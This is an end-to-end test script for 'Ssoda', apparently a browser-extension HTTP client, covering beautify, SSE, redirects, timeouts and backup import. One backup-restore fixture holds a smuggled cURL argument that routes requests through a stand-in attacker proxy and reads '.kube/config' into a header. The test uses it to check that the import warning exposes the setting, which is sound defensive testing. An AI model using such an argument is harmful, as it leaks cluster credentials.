// Ssoda 확장을 실제 브라우저(Playwright Chromium, headless)에 올려 화면 동작 확인
// 실행: 저장소 최상위에서 node tests/e2e/ssoda/e2e.mjs   (다른 사본을 시험하려면 SSODA_EXT=<확장 폴더>)
// 요구 사항과 시험 내용은 tests/e2e/README.md 참고
import http from 'node:http';
import { spawn } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { findChromium, tempDir } from '../lib/chromium.mjs';

const extDir = path.resolve(process.env.SSODA_EXT || fileURLToPath(new URL('../../../ssoda', import.meta.url)));
const label = process.env.SSODA_EXT ? `ssoda (${extDir})` : 'ssoda';
const PROFILE = tempDir('ssoda-e2e-');
const CHROME = findChromium();
const DBG = Number(process.env.CDP_PORT) || 9303;
const EXT_ID = 'cnnlkogkbglbbbcefpaknbmebieabijo';
const APP = `chrome-extension://${EXT_ID}/app.html`;
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

/* ---------------- 시험용 서버 ---------------- */
const seen = [];
const hanging = new Set();
const server = http.createServer((req, res) => {
  let body = '';
  req.on('data', (d) => (body += d));
  req.on('end', () => {
    const u = new URL(req.url, 'http://x');
    seen.push({ method: req.method, path: u.pathname + u.search, headers: req.headers, body });
    const json = (o, code = 200) => {
      res.writeHead(code, { 'Content-Type': 'application/json' });
      res.end(typeof o === 'string' ? o : JSON.stringify(o));
    };
    if (u.pathname === '/echo') return json(body || '{}');
    if (u.pathname === '/big') return json('{"id":1234567890123456789,"price":0.10000000000000000555,"esc":"\\u003cb\\u003e"}');
    if (u.pathname === '/fast') return json({ fast: true });
    if (u.pathname === '/slow') return setTimeout(() => json({ slow: true }), 1500);
    if (u.pathname === '/auth') return json({ auth: req.headers.authorization || null });
    if (u.pathname === '/hang') {
      hanging.add(res);
      return;
    }
    if (u.pathname === '/sse') {
      res.writeHead(200, { 'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache' });
      res.write('data: start\n\n');
      const t = setInterval(() => res.write('data: tick\n\n'), 300);
      // req 의 'close' 는 요청 본문을 다 읽으면 바로 오므로(Node 16+) 응답 쪽 'close'(연결 끊김)만 본다
      res.on('close', () => clearInterval(t));
      hanging.add(res);
      return;
    }
    // 서버가 끝내는 스트림: 주석 1줄, 이벤트 3개(가운데는 이름·id·큰 정수 JSON)
    if (u.pathname === '/sse-done') {
      res.writeHead(200, { 'Content-Type': 'text/event-stream; charset=utf-8' });
      res.write(': hello\n\ndata: first\n\n');
      setTimeout(() => res.write('event: update\nid: 42\ndata: {"n":2,"big":1234567890123456789}\n\n'), 100);
      setTimeout(() => res.end('data: last\n\n'), 200);
      return;
    }
    const redirect = (code, to) => {
      res.writeHead(code, { Location: to });
      res.end();
    };
    if (/^\/r(30[1-3]|30[78])$/.test(u.pathname)) return redirect(Number(u.pathname.slice(2)), '/method');
    if (u.pathname === '/loop') return redirect(302, '/loop?n=' + (Number(u.searchParams.get('n') || 0) + 1));
    if (u.pathname === '/method') return json({ method: req.method, body, ct: req.headers['content-type'] || null });
    json({ path: u.pathname });
  });
});
await new Promise((r) => server.listen(0, '127.0.0.1', r));
const PORT = server.address().port;
const BASE = `http://127.0.0.1:${PORT}`;

/* ---------------- 브라우저 + CDP ---------------- */
fs.mkdirSync(PROFILE, { recursive: true });
const chrome = spawn(CHROME, [
  '--headless=new', `--remote-debugging-port=${DBG}`, `--user-data-dir=${PROFILE}`, `--load-extension=${extDir}`,
  `--disable-extensions-except=${extDir}`, '--no-first-run', '--no-default-browser-check', 'about:blank',
], { windowsHide: true, stdio: 'ignore' });
let ver;
for (let i = 0; i < 100 && !ver; i++) {
  await sleep(200);
  try {
    ver = await (await fetch(`http://127.0.0.1:${DBG}/json/version`)).json();
  } catch (e) { /* not yet */ }
}
if (!ver) throw new Error('chromium did not start');
const ws = new WebSocket(ver.webSocketDebuggerUrl);
await new Promise((r) => ws.addEventListener('open', r, { once: true }));
let nextId = 0;
const pending = new Map();
ws.addEventListener('message', (e) => {
  const m = JSON.parse(e.data);
  if (m.id && pending.has(m.id)) {
    const { resolve, reject } = pending.get(m.id);
    pending.delete(m.id);
    m.error ? reject(new Error(m.error.message)) : resolve(m.result);
  }
});
const send = (method, params = {}, sessionId) => new Promise((resolve, reject) => {
  const id = ++nextId;
  pending.set(id, { resolve, reject });
  ws.send(JSON.stringify({ id, method, params, sessionId }));
});
async function openPage(url) {
  const { targetId } = await send('Target.createTarget', { url });
  const { sessionId } = await send('Target.attachToTarget', { targetId, flatten: true });
  await send('Runtime.enable', {}, sessionId);
  return { targetId, sessionId };
}
async function ev(page, fn, ...args) {
  const expression = `(${fn})(...${JSON.stringify(args)})`;
  const r = await send('Runtime.evaluate', { expression, awaitPromise: true, returnByValue: true }, page.sessionId);
  if (r.exceptionDetails) throw new Error((r.exceptionDetails.exception && r.exceptionDetails.exception.description) || r.exceptionDetails.text);
  return r.result.value;
}
async function waitApp(page) {
  for (let i = 0; i < 100; i++) {
    const ok = await ev(page, () => !!(window.csApp && document.body && !document.body.classList.contains('booting'))).catch(() => false);
    if (ok) return;
    await sleep(100);
  }
  throw new Error('app did not boot');
}

const results = [];
async function check(name, fn) {
  try {
    const info = await fn();
    results.push({ name, ok: true });
    console.log(`PASS  ${name}${info ? '  — ' + info : ''}`);
  } catch (e) {
    results.push({ name, ok: false });
    console.log(`FAIL  ${name}  — ${String(e.message).split('\n')[0].slice(0, 300)}`);
  }
}
const assert = (cond, msg) => {
  if (!cond) throw new Error(msg);
};

const page = await openPage(APP);
await waitApp(page);
console.log(`=== ${label} ===`);

await check('Beautify 가 큰 정수·이스케이프·{{변수}}를 원문 그대로 둠', async () => {
  const r = await ev(page, async (base) => {
    const app = window.csApp;
    const tab = app.newRequestTab({ method: 'POST', url: base + '/echo', body: { mode: 'raw', rawLanguage: 'json', raw: '{"id":1234567890123456789,"n":{{num}},"s":"\\u003cb\\u003e {{name}}","list":[]}' } }, 'beautify');
    await new Promise((r) => setTimeout(r, 200));
    app.views.get(tab.id).beautify();
    return tab.draft.body.raw;
  }, BASE);
  assert(r.includes('1234567890123456789') && r.includes('"n": {{num}}') && r.includes('\\u003cb\\u003e {{name}}') && r.includes('\n  "list": []'), JSON.stringify(r));
});

await check('Beautify 후 전송한 Body 의 큰 정수가 서버에 그대로 도착', async () => {
  seen.length = 0;
  const r = await ev(page, async (base) => {
    const app = window.csApp;
    const tab = app.newRequestTab({ method: 'POST', url: base + '/echo', body: { mode: 'raw', rawLanguage: 'json', raw: '{"orderId":1234567890123456789,"amount":10.10}' } }, 'send-big');
    await new Promise((r) => setTimeout(r, 200));
    app.views.get(tab.id).beautify();
    const res = await app.send(tab, { engine: 'browser' });
    return { status: res.status, sent: tab.draft.body.raw };
  }, BASE);
  const got = seen.find((s) => s.path === '/echo');
  assert(r.status === 200 && got && got.body.includes('1234567890123456789') && got.body.includes('10.10'), JSON.stringify({ r, body: got && got.body }));
  return '서버가 받은 Body: ' + got.body.replace(/\s+/g, ' ');
});

await check('응답 Pretty 보기가 큰 정수·소수 자릿수를 바꾸지 않음', async () => {
  const text = await ev(page, async (base) => {
    const app = window.csApp;
    const tab = app.newRequestTab({ url: base + '/big' }, 'big');
    await new Promise((r) => setTimeout(r, 200));
    await app.send(tab, { engine: 'browser' });
    await new Promise((r) => setTimeout(r, 300));
    return app.views.get(tab.id).response.el.innerText;
  }, BASE);
  assert(text.includes('1234567890123456789') && text.includes('0.10000000000000000555') && !text.includes('1234567890123456800'), text.slice(0, 300));
});

await check('끝나지 않는 SSE 응답이 같은 서버로 가는 다음 요청을 막지 않음', async () => {
  const r = await ev(page, async (base) => {
    const app = window.csApp;
    const a = app.newRequestTab({ url: base + '/sse' }, 'sse');
    await new Promise((r) => setTimeout(r, 200));
    const pa = app.send(a, { engine: 'browser' });
    await new Promise((r) => setTimeout(r, 1000));
    const b = app.newRequestTab({ url: base + '/fast' }, 'fast');
    await new Promise((r) => setTimeout(r, 200));
    const t0 = performance.now();
    const rb = await Promise.race([app.send(b, { engine: 'browser' }), new Promise((r) => setTimeout(() => r({ stuck: true }), 6000))]);
    const ms = Math.round(performance.now() - t0);
    app.cancel(a);
    if (rb.stuck) app.cancel(b);
    await pa;
    return { ms, ok: !!rb.ok, status: rb.status, stuck: !!rb.stuck };
  }, BASE);
  assert(r.ok && r.status === 200 && r.ms < 3000, JSON.stringify(r));
  return `두 번째 요청 ${r.ms} ms`;
});

await check('응답 헤더가 오지 않는 요청 뒤의 요청: "기다리는 중" 표시 + 타임아웃에 대기 시간 포함', async () => {
  const r = await ev(page, async (base) => {
    const app = window.csApp;
    const a = app.newRequestTab({ url: base + '/hang' }, 'hang');
    await new Promise((r) => setTimeout(r, 200));
    const pa = app.send(a, { engine: 'browser' });
    await new Promise((r) => setTimeout(r, 500));
    const b = app.newRequestTab({ url: base + '/fast', settings: { timeout: 1500 } }, 'fast-timeout');
    await new Promise((r) => setTimeout(r, 200));
    const t0 = performance.now();
    const pb = Promise.race([app.send(b, { engine: 'browser' }), new Promise((r) => setTimeout(() => r({ stuck: true }), 6000))]);
    await new Promise((r) => setTimeout(r, 500));
    const waitingText = app.views.get(b.id).response.el.innerText;
    const rb = await pb;
    const ms = Math.round(performance.now() - t0);
    app.cancel(a);
    if (rb.stuck) app.cancel(b);
    await pa;
    return { waitingText, ms, code: rb.error && rb.error.code, msg: rb.error && rb.error.message, stuck: !!rb.stuck };
  }, BASE);
  assert(/같은 서버로 보낸 이전 요청을 기다리는 중/.test(r.waitingText), 'waiting text: ' + r.waitingText.slice(0, 120));
  assert(r.code === 'TIMEOUT' && /이전 요청/.test(r.msg) && r.ms < 4000, JSON.stringify({ code: r.code, msg: r.msg, ms: r.ms, stuck: r.stuck }));
  return `${r.ms} ms 뒤 "${r.msg}"`;
});

await check('히스토리에 보낸 시점의 요청이 남음 (응답 대기 중 편집해도)', async () => {
  const r = await ev(page, async (base) => {
    const app = window.csApp;
    const t = app.newRequestTab({ url: base + '/slow?x=sent' }, 'slow');
    await new Promise((r) => setTimeout(r, 200));
    const p = app.send(t, { engine: 'browser' });
    await new Promise((r) => setTimeout(r, 300));
    t.draft.url = base + '/slow?x=edited';
    app.markChanged(t);
    await p;
    return app.store.state.history[0].request.url;
  }, BASE);
  assert(/x=sent$/.test(r), r);
});

await check('히스토리에서 다시 연 요청이 컬렉션 인증(Inherit)과 컬렉션 변수를 유지', async () => {
  seen.length = 0;
  const r = await ev(page, async (base) => {
    const app = window.csApp;
    const tmp = app.newRequestTab({ url: base + '/{{path}}', auth: { type: 'inherit' } }, 'tmp');
    const request = JSON.parse(JSON.stringify(tmp.draft));
    await app.closeTab(tmp.id, { force: true });
    app.store.state.collections.push({
      id: 'col_e2e', name: 'E2E', description: '',
      auth: { type: 'bearer', bearer: { token: 'tok-123' }, basic: { username: '', password: '' }, apikey: { key: '', value: '', in: 'header' } },
      variables: [{ id: 'v1', key: 'path', value: 'auth', enabled: true, description: '' }],
      items: [{ id: 'req_e2e', type: 'request', name: 'auth req', request }],
    });
    app.store.changed('collections');
    const tab = app.openItem('req_e2e');
    await new Promise((r) => setTimeout(r, 200));
    const r1 = await app.send(tab, { engine: 'browser' });
    const entry = app.store.state.history[0];
    const t2 = app.openHistory(entry);
    await new Promise((r) => setTimeout(r, 200));
    const r2 = await app.send(t2, { engine: 'browser' });
    const dec = (res) => (res && res.ok ? new TextDecoder().decode(res.body) : (res && res.error && res.error.message));
    return { first: dec(r1), again: dec(r2), againUrl: r2.sentUrl };
  }, BASE);
  assert(/tok-123/.test(r.first) && /tok-123/.test(r.again) && /\/auth$/.test(r.againUrl), JSON.stringify(r));
});

await check('백업 복원 확인창에 cURL 실행 설정(추가 인자, -k)과 SSH 환경이 보임', async () => {
  const backup = {
    app: 'ssoda', version: 1,
    data: {
      collections: [{ id: 'c1', name: '공유받은 컬렉션', items: [{ id: 'r1', type: 'request', name: '주문 조회', request: { url: 'https://api.example.com/o', settings: { curl: { extra: '--proxy http://evil.example:8080 --proxy-header @.kube/config', insecure: true } } } }] }],
      environments: [{ id: 'e1', name: '운영1', variables: [], ssh: { enabled: true, host: '10.0.0.9', port: 22, user: 'app' } }],
      settings: {},
    },
  };
  const r = await ev(page, async (text) => {
    const before = window.csApp.store.state.collections.length;
    document.querySelector('.topbar button[title^="가져오기"]').click();
    await new Promise((r) => setTimeout(r, 300));
    const ta = document.querySelector('textarea.import-ta');
    ta.value = text;
    const btn = [...document.querySelectorAll('.modal button')].find((b) => b.textContent.trim() === '가져오기');
    btn.click();
    await new Promise((r) => setTimeout(r, 400));
    const dlg = [...document.querySelectorAll('.modal')].pop();
    const out = dlg.innerText;
    [...dlg.querySelectorAll('button')].find((b) => b.textContent.trim() === '취소').click();
    await new Promise((r) => setTimeout(r, 200));
    document.querySelectorAll('.modal-backdrop').forEach((b) => b.querySelector('.modal-x') && b.querySelector('.modal-x').click());
    return { out, unchanged: window.csApp.store.state.collections.length === before };
  }, JSON.stringify(backup));
  assert(/cURL 로 실행할 때 적용되는 설정이 있는 요청 1개/.test(r.out) && /--proxy http:\/\/evil\.example:8080/.test(r.out) && /-k \(SSL 인증서 검사 끔\)/.test(r.out) && /SSH 터널을 쓰는 환경 1개/.test(r.out) && !/kube/.test(r.out), r.out.slice(0, 400));
  assert(r.unchanged, '취소했는데 데이터가 바뀜');
});

await check('도우미가 구버전(v1.3.1)이면 도우미 창에 새 버전 안내', async () => {
  const r = await ev(page, async () => {
    const app = window.csApp;
    app.ui.helperStatus = async () => ({ ok: true, hostVersion: '1.3.1', curl: 'curl 8.22.0', path: 'C:\\Windows\\System32\\curl.exe' });
    const stale = await app.staleHostKeyInfo();
    app.ui.helperStatus = async () => ({ ok: true, hostVersion: '1.3.2', curl: 'curl 8.22.0', path: 'C:\\Windows\\System32\\curl.exe' });
    const fresh = await app.staleHostKeyInfo();
    app.ui.helperStatus = async () => ({ ok: true, hostVersion: '1.3.1', curl: 'curl 8.22.0', path: 'C:\\Windows\\System32\\curl.exe' });
    document.querySelector('.topbar button[title="설정"]').click();
    await new Promise((r) => setTimeout(r, 300));
    [...document.querySelectorAll('.modal button')].find((b) => /도우미 설정 열기/.test(b.textContent)).click();
    await new Promise((r) => setTimeout(r, 500));
    const box = document.querySelector('.helper-status');
    const text = box ? box.innerText : '';
    document.querySelectorAll('.modal-x').forEach((x) => x.click());
    return { stale, fresh, text };
  });
  assert(r.stale.code === 'HOST_OUTDATED' && !r.fresh.code, JSON.stringify({ stale: r.stale, fresh: r.fresh }));
  assert(/새 버전\(v1\.3\.2\)/.test(r.text), r.text.slice(0, 200));
});

await check('다른 서버로 리다이렉트되면 그 서버 차례를 기다렸다 보내고, 그 서버로 가는 다른 요청의 헤더가 섞이지 않음', async () => {
  // 두 번째 서버(다른 host:port)
  const seen1 = [];
  const seen2 = [];
  const holds = new Set();
  const s2 = http.createServer((req, res) => {
    seen2.push({ path: req.url, headers: req.headers });
    if (req.url === '/hang') { holds.add(res); return; }
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end('{"landed":true}');
  });
  await new Promise((r) => s2.listen(0, '127.0.0.1', r));
  const P2 = s2.address().port;
  const redirSrv = http.createServer((req, res) => {
    seen1.push({ path: req.url, headers: req.headers });
    res.writeHead(302, { Location: `http://127.0.0.1:${P2}/landing` });
    res.end();
  });
  await new Promise((r) => redirSrv.listen(0, '127.0.0.1', r));
  const P1 = redirSrv.address().port;
  const r = await ev(page, async (p1, p2) => {
    const app = window.csApp;
    const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
    const b = app.newRequestTab({ url: `http://127.0.0.1:${p2}/hang`, headers: [{ key: 'User-Agent', value: 'ua-B', enabled: true }], cookies: [{ key: 'b', value: 'secret-of-B', enabled: true }] }, 'B');
    await sleep(200);
    const pb = app.send(b, { engine: 'browser' });
    await sleep(500);
    const a = app.newRequestTab({
      url: `http://127.0.0.1:${p1}/start`,
      headers: [{ key: 'Authorization', value: 'Bearer tok-A', enabled: true }, { key: 'X-Trace', value: 'from-A', enabled: true }, { key: 'User-Agent', value: 'ua-A', enabled: true }],
      cookies: [{ key: 'a', value: 'cookie-of-A', enabled: true }],
    }, 'A');
    await sleep(200);
    const pa = app.send(a, { engine: 'browser' });
    await sleep(800);
    const waitingText = app.views.get(a.id).response.el.innerText;
    app.cancel(b);
    await pb;
    const ra = await Promise.race([pa, sleep(6000).then(() => ({ stuck: true }))]);
    if (ra.stuck) app.cancel(a);
    return { waitingText, ok: ra.ok, status: ra.status, hops: (ra.hops || []).length, warnings: ra.warnings || [], stuck: !!ra.stuck };
  }, P1, P2);
  const start = seen1.find((s) => s.path === '/start');
  const landed = seen2.find((s) => s.path === '/landing');
  for (const h of holds) h.destroy();
  s2.close();
  redirSrv.close();
  assert(/같은 서버로 보낸 이전 요청을 기다리는 중/.test(r.waitingText), 'A 가 B 차례를 기다리지 않음: ' + r.waitingText.slice(0, 120));
  assert(r.ok && r.status === 200 && r.hops === 2 && !r.stuck, JSON.stringify(r));
  assert(start && start.headers.authorization === 'Bearer tok-A' && /cookie-of-A/.test(start.headers.cookie || '') && start.headers['user-agent'] === 'ua-A' && !start.headers.origin, JSON.stringify(start && start.headers));
  const h2 = (landed && landed.headers) || {};
  // B 의 쿠키·User-Agent 가 섞이지 않고, A 의 인증 정보(Authorization·Cookie)는 다른 서버로 가지 않으며, 나머지 헤더는 curl 처럼 이어짐
  assert(landed && !h2.cookie && !h2.authorization && h2['x-trace'] === 'from-A' && h2['user-agent'] === 'ua-A' && !h2.origin, JSON.stringify(h2));
  assert(!r.warnings.some((w) => /섞/.test(w)), r.warnings.join(' / '));
  return `A→B 리다이렉트: B 의 쿠키 없음, User-Agent=${h2['user-agent']}, X-Trace=${h2['x-trace']}`;
});

await check('리다이렉트: 303 은 GET 으로 바꾸고 본문을 빼며, 307 은 메서드·본문 그대로, 302 는 POST 만 GET', async () => {
  const r = await ev(page, async (base) => {
    const app = window.csApp;
    const go = async (method, path) => {
      const t = app.newRequestTab({ method, url: base + path, body: { mode: 'raw', rawLanguage: 'json', raw: '{"a":1}' } }, path);
      await new Promise((r) => setTimeout(r, 100));
      const res = await app.send(t, { engine: 'browser' });
      const got = res.ok ? JSON.parse(new TextDecoder().decode(res.body)) : res.error;
      return { ...got, hops: (res.hops || []).map((h) => h.method + ' ' + new URL(h.url).pathname + ' ' + (h.statusCode || '')) };
    };
    return { r303: await go('POST', '/r303'), r307: await go('POST', '/r307'), r308: await go('PUT', '/r308'), r302: await go('POST', '/r302'), r302put: await go('PUT', '/r302') };
  }, BASE);
  assert(r.r303.method === 'GET' && r.r303.body === '' && r.r303.ct === null, JSON.stringify(r.r303));
  assert(r.r307.method === 'POST' && r.r307.body === '{"a":1}' && r.r307.ct === 'application/json', JSON.stringify(r.r307));
  assert(r.r308.method === 'PUT' && r.r308.body === '{"a":1}', JSON.stringify(r.r308));
  assert(r.r302.method === 'GET' && r.r302.body === '', JSON.stringify(r.r302));
  assert(r.r302put.method === 'PUT' && r.r302put.body === '{"a":1}', JSON.stringify(r.r302put));
  assert(r.r303.hops.join(',') === 'POST /r303 303,GET /method 200', r.r303.hops.join(','));
  return r.r303.hops.join(' → ');
});

await check('리다이렉트: 따라가기를 끄면 3xx 를 그대로, 20번을 넘으면 오류', async () => {
  const r = await ev(page, async (base) => {
    const app = window.csApp;
    const t1 = app.newRequestTab({ url: base + '/r303', settings: { followRedirects: false } }, 'no-follow');
    await new Promise((r) => setTimeout(r, 100));
    const a = await app.send(t1, { engine: 'browser' });
    const t2 = app.newRequestTab({ url: base + '/loop' }, 'loop');
    await new Promise((r) => setTimeout(r, 100));
    const b = await app.send(t2, { engine: 'browser' });
    return {
      a: { ok: a.ok, status: a.status, opaque: a.opaqueRedirect, loc: (a.headers || []).find((x) => x.name.toLowerCase() === 'location')?.value },
      b: { ok: b.ok, code: b.error && b.error.code, msg: b.error && b.error.message, hops: (b.hops || []).length },
    };
  }, BASE);
  assert(r.a.ok && r.a.status === 303 && r.a.opaque && r.a.loc === '/method', JSON.stringify(r.a));
  assert(!r.b.ok && r.b.code === 'net::ERR_TOO_MANY_REDIRECTS' && r.b.hops === 21, JSON.stringify(r.b));
  return `${r.b.msg} (요청 ${r.b.hops}번)`;
});

await check('SSE: 받는 대로 이벤트를 보여 주고, 멈춤을 누르면 그때까지 받은 내용이 응답으로 남음', async () => {
  const r = await ev(page, async (base) => {
    const app = window.csApp;
    const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
    const t = app.newRequestTab({ url: base + '/sse' }, 'sse-live');
    await sleep(200);
    const p = app.send(t, { engine: 'browser' });
    await sleep(1200);
    const view = app.views.get(t.id).response;
    const live = { text: view.el.innerText, rows: view.el.querySelectorAll('.sse-row').length };
    view.el.querySelector('.sse-stop').click();
    const res = await p;
    await sleep(100);
    return {
      live, ok: res.ok, status: res.status, end: res.stream && res.stream.end, n: res.stream ? res.stream.events.length : -1,
      rows: view.el.querySelectorAll('.sse-row').length, text: view.el.innerText, loading: app.controllers.has(t.id),
    };
  }, BASE);
  assert(/받는 중/.test(r.live.text) && /멈춤/.test(r.live.text) && r.live.rows >= 3, JSON.stringify(r.live).slice(0, 300));
  assert(r.ok && r.status === 200 && r.end === 'stopped' && r.n >= 4 && r.rows === r.n && !r.loading, JSON.stringify({ ok: r.ok, end: r.end, n: r.n, rows: r.rows }));
  assert(new RegExp(`이벤트 ${r.n}개 · .* · 멈춤`).test(r.text), r.text.slice(0, 300));
  return `받는 중 ${r.live.rows}개 → 멈춘 뒤 응답에 ${r.n}개`;
});

await check('SSE: 타임아웃이 되면 끊고 그때까지 받은 이벤트를 응답으로 (오류 아님)', async () => {
  const r = await ev(page, async (base) => {
    const app = window.csApp;
    const t = app.newRequestTab({ url: base + '/sse', settings: { timeout: 1000 } }, 'sse-timeout');
    await new Promise((r) => setTimeout(r, 200));
    const t0 = performance.now();
    const res = await app.send(t, { engine: 'browser' });
    return { ms: Math.round(performance.now() - t0), ok: res.ok, end: res.stream && res.stream.end, n: res.stream ? res.stream.events.length : -1, warnings: res.warnings || [] };
  }, BASE);
  assert(r.ok && r.end === 'timeout' && r.n >= 3 && r.ms < 3000, JSON.stringify(r));
  assert(r.warnings.some((w) => /타임아웃\(1000 ms\)이 되어 스트림을 끊었습니다/.test(w)), r.warnings.join(' / '));
  return `${r.ms} ms 에 끊음, 이벤트 ${r.n}개`;
});

await check('SSE: 서버가 끝낸 스트림은 Events 보기로 (이름·id·주석 수, JSON 이벤트는 눌러서 펼치면 큰 정수 그대로)', async () => {
  const r = await ev(page, async (base) => {
    const app = window.csApp;
    const t = app.newRequestTab({ url: base + '/sse-done' }, 'sse-done');
    await new Promise((r) => setTimeout(r, 200));
    const res = await app.send(t, { engine: 'browser' });
    await new Promise((r) => setTimeout(r, 100));
    const view = app.views.get(t.id).response;
    const rows = [...view.el.querySelectorAll('.sse-row')];
    rows[1] && rows[1].click();
    const pretty = (view.el.querySelector('.sse-json') || {}).textContent || '';
    return {
      ok: res.ok, end: res.stream && res.stream.end, events: res.stream ? res.stream.events.map((e) => [e.type, e.id, e.data]) : [], comments: res.stream && res.stream.comments,
      rows: rows.length, summary: (view.el.querySelector('.sse-summary') || {}).textContent || '', pretty,
    };
  }, BASE);
  assert(r.ok && r.end === 'closed' && r.rows === 3 && r.comments === 1, JSON.stringify(r).slice(0, 300));
  assert(JSON.stringify(r.events) === JSON.stringify([['message', '', 'first'], ['update', '42', '{"n":2,"big":1234567890123456789}'], ['message', '42', 'last']]), JSON.stringify(r.events));
  assert(/이벤트 3개/.test(r.summary) && /서버가 스트림을 끝냄/.test(r.summary) && /주석 1줄/.test(r.summary), r.summary);
  assert(/"big": 1234567890123456789/.test(r.pretty), r.pretty);
  return r.summary;
});

await check('기본 타임아웃 60초: 예전 설정의 0(무제한)은 다시 열 때 한 번 60초로 바꾸고 알림', async () => {
  const fresh = await ev(page, () => ({ timeout: window.csApp.settings.timeout, rev: window.csApp.settings.settingsRev }));
  // 예전 판 설정(판 번호 없음, 0)을 넣고 이 탭이 덮어쓰지 않게 멈춘 뒤 다시 연다
  await ev(page, async () => {
    const s = { ...window.csApp.settings, timeout: 0 };
    delete s.settingsRev;
    window.csApp.store.suspended = true;
    await chrome.storage.local.set({ settings: s });
    setTimeout(() => location.reload(), 50);
  });
  await sleep(600);
  await waitApp(page);
  await sleep(300);
  const first = await ev(page, async () => ({
    timeout: window.csApp.settings.timeout,
    stored: (await chrome.storage.local.get('settings')).settings,
    toast: /기본 타임아웃을 60초로 바꿨습니다/.test(document.body.innerText),
  }));
  await ev(page, () => setTimeout(() => location.reload(), 50));
  await sleep(600);
  await waitApp(page);
  await sleep(300);
  const second = await ev(page, () => ({ timeout: window.csApp.settings.timeout, toast: /기본 타임아웃을 60초로 바꿨습니다/.test(document.body.innerText) }));
  assert(fresh.timeout === 60000 && fresh.rev === 2, JSON.stringify(fresh));
  assert(first.timeout === 60000 && first.stored.timeout === 60000 && first.stored.settingsRev === 2 && first.toast, JSON.stringify({ ...first, stored: { timeout: first.stored.timeout, rev: first.stored.settingsRev } }));
  assert(second.timeout === 60000 && !second.toast, JSON.stringify(second));
});

await check('앱 탭을 하나 더 열면 먼저 열린 탭은 저장을 멈추고 안내를 띄움', async () => {
  await ev(page, async () => {
    window.csApp.store.state.globals.variables.push({ id: 'g1', key: 'before', value: '1', enabled: true, description: '' });
    window.csApp.store.changed('globals');
    await window.csApp.store.flush();
    // 아직 저장되지 않은 변경(디바운스 대기 중)을 만든다: 자동 저장을 멈추고 pending 에만 올린다
    window.csApp.store._flush = () => {};
    window.csApp.store.state.globals.variables.push({ id: 'g0', key: 'unsaved-in-old-tab', value: '1', enabled: true, description: '' });
    window.csApp.store.changed('globals');
  });
  const page2 = await openPage(APP);
  await waitApp(page2);
  await sleep(500);
  const first = await ev(page, async () => {
    const blocked = !!document.querySelector('.instance-block');
    window.csApp.store.state.globals.variables.push({ id: 'g2', key: 'from-old-tab', value: 'x', enabled: true, description: '' });
    window.csApp.store.changed('globals');
    await window.csApp.store.flush();
    return { blocked, suspended: !!window.csApp.store.suspended, text: (document.querySelector('.instance-block') || {}).innerText || '' };
  });
  const stored = await ev(page2, async () => {
    const d = await chrome.storage.local.get('globals');
    return { keys: d.globals.variables.map((v) => v.key), loaded: window.csApp.store.state.globals.variables.map((v) => v.key), suspended: !!window.csApp.store.suspended };
  });
  await send('Target.closeTarget', { targetId: page2.targetId });
  assert(first.blocked && first.suspended, JSON.stringify(first));
  assert(!stored.keys.includes('from-old-tab') && stored.keys.includes('before') && !stored.suspended, JSON.stringify(stored));
  // 새 탭은 먼저 열린 탭이 마지막 변경을 저장한 뒤에 데이터를 읽었어야 한다
  assert(stored.loaded.includes('unsaved-in-old-tab'), '새 탭이 이전 탭의 마지막 변경 없이 열림: ' + JSON.stringify(stored.loaded));
  return first.text.split('\n')[0];
});

for (const res of hanging) try { res.destroy(); } catch (e) { /* */ }
server.close();
try { await send('Browser.close'); } catch (e) { /* */ }
chrome.kill();
await sleep(500);
fs.rmSync(PROFILE, { recursive: true, force: true });
const failed = results.filter((r) => !r.ok).length;
console.log(`\n${label}: ${results.length - failed}/${results.length} 통과`);
process.exit(failed ? 1 : 0);
